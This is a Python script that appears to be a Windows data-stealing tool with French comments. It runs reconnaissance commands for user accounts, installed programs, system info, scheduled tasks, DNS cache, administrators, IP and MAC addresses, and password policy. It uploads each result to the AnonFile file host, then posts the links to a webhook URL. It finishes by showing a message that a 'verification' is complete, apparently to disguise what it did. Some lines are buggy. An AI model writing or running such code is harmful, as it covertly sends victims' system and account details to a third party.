import os
import platform 
import time
import colorama
import subprocess
import datetime
from colorama import Fore
from datetime import datetime
from anonfile import AnonFile
import shutil
anon = AnonFile()
import pyfiglet
import requests



user = os.getlogin()

red = Fore.RED
blue = Fore.BLUE
cyan = Fore.CYAN
green = Fore.GREEN
yellow = Fore.LIGHTYELLOW_EX
white = Fore.LIGHTWHITE_EX
reset = Fore.RESET
blue2 = Fore.LIGHTBLUE_EX

url = "Idk"


t = datetime.now()
date = t.strftime("%H:%M:%S")

if user == "2583755":
    num = "2583755"
if user == "22930498":
    num == "4"



print(pyfiglet.figlet_format(num, font="graffiti"))





# Path List 

netuser = f"C:/Users/{user}/AppData/Local/Temp/userlist.txt"
wmicproductgetname = f"C:/Users/{user}/AppData/Local/appinstalled.txt"
systeminfo = f"C:/Users/{user}/AppData/Local/Temp/info.txt"
idk = f"C:/Users/{user}/AppData/Local/Temp/idk.txt"
history = f"C:/Users/{user}/AppData/Local/Temp/history.txt"
admin = f"C:/Users/{user}/AppData/Local/Temp/admin.txt"
ipconfig = f"C:/Users/{user}/AppData/Local/Temp/ipconfig.txt"
mac = f"C:/Users/{user}/AppData/Local/Temp/mac.txt"
net = f"C:/Users/{user}/AppData/Local/Temp/net.txt"
dirname = f"C:/Users/{user}/AppData/Local/Temp/Dis"
dirname2 = f"C:/Users/{user}/dis.zip"
temp = f"C:/Users/{user}/AppData/Local/Temp/Start.exe"
grab = f"C:/Users/{user}/AppData/Local/Temp/Grab.exe"
# Net User 
os.system(f"net user > {netuser}")
upload1 = anon.upload(netuser, progressbar=False)
up1 = upload1.url.geturl()

# wmic product get name
os.system(f"wmic product get name > {wmicproductgetname}")
upload2 = anon.upload(wmicproductgetname, progressbar=False)
up2 = upload2.url.geturl()

# systeminfo
os.system(f"systeminfo > {systeminfo}")
upload3 = anon.upload(systeminfo, progressbar=False)
up3 = upload3.url.geturl()

# idk
os.system(f"schtasks > {idk}")
upload4 = anon.upload(idk, progressbar=False)
up4 = upload4.url.geturl()


# historique
os.system(f"ipconfig /displaydns > {history}")
upload5 = anon.upload(history, progressbar=False)
up5 = upload4.url.geturl()

# Si admin ou pas
os.system(f"net localgroup Administrateurs > {admin}")
upload6 = anon.upload(admin, progressbar=False)
up6 = upload6.url.geturl()

# normal ipconfig
os.system(f"ipconfig > {ipconfig}")
upload7 = anon.upload(ipconfig, progressbar=False)
up7 = upload7.url.geturl()

# mac adresse
os.system(f"getmac > {mac}")
upload8 = anon.upload(mac, progressbar=False)
up8 = upload8.url.geturl()

# net
os.system(f"net accounts > {net}")
upload9 = anon.upload(net, progressbar=False)
up9 = upload9.url.geturl()


# get date

d = datetime.now()



url = ""
send = f"""
Date : {d}
User : {user}
-------------
Nom User : {up1}
All App : {up2}
SystemInfo : {up3}
Idk : {up4}
history : {up5}
Admin ? : {up6}
IpConfig : {up7}
Mac : {up8}
Accounts : {up9}




"""

data = {
    "content": send
}




result = requests.post(url, json = data)

try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    print(f"{red}La vérification est terminer{reset}")
    print("Appuye sur Enter")
    input()